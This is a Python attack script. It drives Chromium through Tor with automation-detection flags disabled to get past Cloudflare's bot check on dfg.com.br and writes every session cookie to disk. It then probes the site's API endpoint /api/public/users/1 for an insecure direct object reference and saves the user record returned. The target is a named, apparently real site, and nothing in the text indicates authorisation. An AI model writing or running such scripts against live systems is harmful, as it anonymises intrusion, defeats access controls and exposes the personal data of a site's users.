import nodriver as uc
import asyncio, time, json, sys
async def main():
  browser = await uc.start(
    browser_executable_path='/usr/bin/chromium-browser',
    browser_args=['--no-sandbox','--disable-setuid-sandbox','--disable-dev-shm-usage',
      '--proxy-server=socks5://127.0.0.1:9050','--lang=en-US,en','--window-size=1920,1080',
      '--disable-blink-features=AutomationControlled']
  )
  page = await browser.get('https://www.dfg.com.br/', new_tab=True)
  print('[1] loaded, polling for cf_clearance...')
  solved=False
  t0=time.time()
  while time.time()-t0 < 100:
    await asyncio.sleep(2)
    try:
      title = await page.evaluate('document.title')
    except: title='?'
    cookies = await browser.cookies.get_all()
    cf = [c for c in cookies if c.name=='cf_clearance']
    elapsed = int(time.time()-t0)
    if cf:
      print(f'  [t={elapsed}s] cf_clearance SET! len={len(cf[0].value)} title="{title}"')
      solved=True; break
    if elapsed % 10 == 0:
      print(f'  [t={elapsed}s] title="{title}" url={page.url[:60]} cookies={[c.name for c in cookies]}')
  cookies = await browser.cookies.get_all()
  cdict=[{'name':c.name,'value':c.value,'domain':c.domain,'path':c.path} for c in cookies]
  open('cookies_nodriver.json','w').write(json.dumps(cdict,indent=2))
  print('[2] cookies:', [(c.name,c.value[:15]) for c in cookies])
  if not solved:
    print('[2] NOT solved after 100s. title=', await page.evaluate('document.title'))
    open('nodriver_final.html','w').write(await page.get_content())
    browser.close(); return
  # Test IDOR
  print('[3] Testing /api/public/users/1 ...')
  try:
    p2 = await browser.get('https://api.dfg.com.br/api/public/users/1', new_tab=True)
    await asyncio.sleep(3)
    txt = await p2.evaluate('document.body.innerText')
    print('  api users/1 body:', txt[:700])
    open('users_1_nodriver.json','w').write(txt)
  except Exception as e:
    print('  api test err:', e)
  try: browser.close()
  except: pass
asyncio.run(main())
